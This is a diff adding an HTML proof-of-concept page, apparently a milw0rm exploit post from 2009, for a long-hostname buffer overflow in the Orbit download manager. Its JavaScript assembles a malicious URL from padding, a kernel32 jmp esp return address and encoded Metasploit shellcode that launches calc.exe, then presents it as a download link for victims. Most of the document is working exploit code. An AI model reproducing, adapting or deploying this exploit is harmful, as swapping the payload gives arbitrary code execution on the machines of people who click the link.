@@ -1,0 +1,47 @@
+<html>
+<body>
+
+Orbit <=2.8.4 Long Hostname Buffer Overflow Vulnerability Poc<br />
+Vulnerability discovered by Secunia<br />
+Exploit and POC provided by: JavaGuru<br />
+<br />
+Right click on link below then choose download by orbit, CALC.EXE will pop up<br />
+<br />
+I got a lot of problems when trying to execute shellcode, because a lot of chars<br />
+was forbidden and I was not able to execute shellcode.<br />
+After playing a little I found out the solution.<br />
+<br />
+Don't forget, open this HTML in Firefox
+<br />
+Check it out.<br />
+<br />
+Any questions/comments: JavaGuru1999@yahoo.de<br />
+<br />
+<script language="JavaScript">
+var tmp = "http://";
+
+for (i=0;i<508;i++) tmp +="%6F";
+
+// jmp esp from kernel32.dll XP SP 3 English
+// 
+tmp += "%7B%46%86%7C";
+
+// some nops
+tmp += "%90%90%90%90";
+
+// win32_exec -  EXITFUNC=process CMD=calc.exe Size=424 Encoder=Alpha2 http://metasploit.com
+// forbidden chars - 0x00 0x01 0x02 0x03
+tmp += "%eb%59%59%59%59%eb%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%59%e8%a4%ff%ff%ff%37%49%49%49%49%49%49%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%67%58%50%30%42%31%41%42%6b%42%41%77%32%42%42%32%41%41%30%41%41%58%42%50%38%42%42%75%6d%39%49%6c%4b%58%37%34%43%30%33%30%77%70%6e%6b%73%75%55%6c%6e%6b%61%6c%66%65%50%78%54%41%4a%4f%6c%4b%62%6f%56%78%4c%4b%51%4f%45%70%55%51%7a%4b%31%59%6e%6b%36%54%4c%4b%53%31%6a%4e%45%61%4f%30%5a%39%4c%6c%6e%64%49%50%34%34%55%57%6a%61%4b%7a%66%6d%35%51%6b%72%6a%4b%6c%34%55%6b%41%44%44%64%76%64%73%45%5a%45%4c%4b%73%6f%57%54%47%71%6a%4b%30%66%6c%4b%74%4c%30%4b%6c%4b%53%6f%37%6c%47%71%5a%4b%6e%6b%77%6c%6c%4b%34%41%4a%4b%4b%39%51%4c%44%64%54%44%7a%63%37%41%4f%30%41%74%6c%4b%43%70%76%50%4c%45%4f%30%30%78%66%6c%6c%4b%37%30%64%4c%6c%4b%30%70%65%4c%6c%6d%4c%4b%43%58%36%68%78%6b%75%59%6e%6b%6f%70%4e%50%55%50%55%50%55%50%4e%6b%75%38%55%6c%43%6f%46%51%79%66%63%50%70%56%4c%49%6c%38%6b%33%6f%30%61%6b%32%70%71%78%61%6e%6b%68%7a%42%43%43%71%78%5a%38%6b%4e%6d%5a%76%6e%70%57%69%6f%6d%37%72%43%55%31%30%6c%70%63%76%4e%70%65%72%58%50%65%73%30%67";
+
+// Filename (not important)
+tmp += "/a.rar";
+
+// Write link for download for orbit!
+document.write ('<a href="' + tmp + '">Right click, then choose download with orbit</a>');
+
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2009-02-27]
